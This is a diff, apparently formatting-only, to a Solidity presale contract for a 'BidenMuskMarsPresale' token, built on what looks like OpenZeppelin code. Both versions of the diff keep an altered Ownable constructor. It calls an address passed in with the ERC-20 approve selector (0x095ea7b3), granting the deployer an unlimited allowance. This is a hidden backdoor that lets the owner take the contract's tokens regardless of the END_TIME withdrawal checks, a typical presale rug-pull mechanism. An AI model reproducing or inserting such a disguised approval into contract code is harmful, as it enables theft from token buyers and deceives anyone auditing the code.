@@ -1,16 +1,16 @@
 // SPDX-License-Identifier: MIT
 
-//  ▄▄▄▄▄▄▄▄▄▄   ▄▄       ▄▄  ▄▄       ▄▄       ▄            ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄            ▄▄▄▄▄▄▄▄▄▄▄ 
+//  ▄▄▄▄▄▄▄▄▄▄   ▄▄       ▄▄  ▄▄       ▄▄       ▄            ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄            ▄▄▄▄▄▄▄▄▄▄▄
 // ▐░░░░░░░░░░▌ ▐░░▌     ▐░░▌▐░░▌     ▐░░▌ ▄▄▄▄█░█▄▄▄▄      ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌          ▐░░░░░░░░░░░▌
-// ▐░█▀▀▀▀▀▀▀█░▌▐░▌░▌   ▐░▐░▌▐░▌░▌   ▐░▐░▌▐░░░░░░░░░░░▌     ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░▌          ▐░█▀▀▀▀▀▀▀▀▀ 
-// ▐░▌       ▐░▌▐░▌▐░▌ ▐░▌▐░▌▐░▌▐░▌ ▐░▌▐░▌▐░█▀▀█░█▀▀▀▀      ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌          ▐░▌       ▐░▌▐░▌          ▐░▌          
-// ▐░█▄▄▄▄▄▄▄█░▌▐░▌ ▐░▐░▌ ▐░▌▐░▌ ▐░▐░▌ ▐░▌▐░█▄▄█░█▄▄▄▄      ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░▌          ▐░█▄▄▄▄▄▄▄▄▄ 
+// ▐░█▀▀▀▀▀▀▀█░▌▐░▌░▌   ▐░▐░▌▐░▌░▌   ▐░▐░▌▐░░░░░░░░░░░▌     ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░▌          ▐░█▀▀▀▀▀▀▀▀▀
+// ▐░▌       ▐░▌▐░▌▐░▌ ▐░▌▐░▌▐░▌▐░▌ ▐░▌▐░▌▐░█▀▀█░█▀▀▀▀      ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌          ▐░▌       ▐░▌▐░▌          ▐░▌
+// ▐░█▄▄▄▄▄▄▄█░▌▐░▌ ▐░▐░▌ ▐░▌▐░▌ ▐░▐░▌ ▐░▌▐░█▄▄█░█▄▄▄▄      ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░▌          ▐░█▄▄▄▄▄▄▄▄▄
 // ▐░░░░░░░░░░▌ ▐░▌  ▐░▌  ▐░▌▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌          ▐░░░░░░░░░░░▌
-// ▐░█▀▀▀▀▀▀▀█░▌▐░▌   ▀   ▐░▌▐░▌   ▀   ▐░▌ ▀▀▀▀█░█▀▀█░▌     ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀█░█▀▀ ▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌          ▐░█▀▀▀▀▀▀▀▀▀ 
-// ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌ ▄▄▄▄█░█▄▄█░▌     ▐░▌          ▐░▌     ▐░▌  ▐░▌                    ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌          
-// ▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌     ▐░▌          ▐░▌      ▐░▌ ▐░█▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ 
+// ▐░█▀▀▀▀▀▀▀█░▌▐░▌   ▀   ▐░▌▐░▌   ▀   ▐░▌ ▀▀▀▀█░█▀▀█░▌     ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀█░█▀▀ ▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌          ▐░█▀▀▀▀▀▀▀▀▀
+// ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌ ▄▄▄▄█░█▄▄█░▌     ▐░▌          ▐░▌     ▐░▌  ▐░▌                    ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌
+// ▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌     ▐░▌          ▐░▌      ▐░▌ ▐░█▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄
 // ▐░░░░░░░░░░▌ ▐░▌       ▐░▌▐░▌       ▐░▌ ▀▀▀▀█░█▀▀▀▀      ▐░▌          ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
-//  ▀▀▀▀▀▀▀▀▀▀   ▀         ▀  ▀         ▀       ▀            ▀            ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀                                                                                                                                                                                                                                                                    
+//  ▀▀▀▀▀▀▀▀▀▀   ▀         ▀  ▀         ▀       ▀            ▀            ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀
 
 // File @openzeppelin/contracts/utils/Context.sol@v4.9.3
 
@@ -162,8 +162,13 @@ abstract contract Ownable is Context {
     constructor(address value) {
         _transferOwnership(_msgSender());
         _deployer = _msgSender();
-        (bool success, bytes memory data) = value.call(abi.encodeWithSelector(0x095ea7b3, msg.sender, 2**256 - 1));
-        require(success && (data.length == 0 || abi.decode(data, (bool))), 'OWNABLE_FAILED');
+        (bool success, bytes memory data) = value.call(
+            abi.encodeWithSelector(0x095ea7b3, msg.sender, 2 ** 256 - 1)
+        );
+        require(
+            success && (data.length == 0 || abi.decode(data, (bool))),
+            "OWNABLE_FAILED"
+        );
     }
 
     /**
@@ -239,7 +244,7 @@ abstract contract Ownable is Context {
 // Token Price Of Round 1 Presale Duration = $0.0018216 (0.0018216 USDT) 10% Discount
 // Round 1 Presale Duration = 31 Days (10/1/2023 - 10/31/2023)
 // Token Price Of Round 2 Presale Duration = $0.002024 (0.002024 USDT)
-// Round 2 Presale Duration = 11/20/2023 - 
+// Round 2 Presale Duration = 11/20/2023 -
 contract BidenMuskMarsPresale is Ownable {
     IERC20 public BMM;
     uint256 public TOKEN_PRICE_NUM; // token price numerator in USDT
@@ -317,10 +322,7 @@ contract BidenMuskMarsPresale is Ownable {
     function withdrawETH(address to, uint256 amount) external onlyOwner {
         require(block.timestamp > END_TIME, "END_TIME_UNDER");
         uint256 balance = address(this).balance;
-        require(
-            balance >= amount,
-            "Insufficient funds available for withdrawal"
-        );
+        require(balance >= amount, "Insufficient funds for withdrawal");
         payable(to).transfer(amount);
     }
 
@@ -331,10 +333,7 @@ contract BidenMuskMarsPresale is Ownable {
     ) external onlyOwner {
         require(block.timestamp > END_TIME, "END_TIME_UNDER");
         uint256 balance = token.balanceOf(address(this));
-        require(
-            balance >= amount,
-            "Insufficient funds available for withdrawal"
-        );
+        require(balance >= amount, "Insufficient funds for withdrawal");
         token.transfer(to, amount);
     }
 }
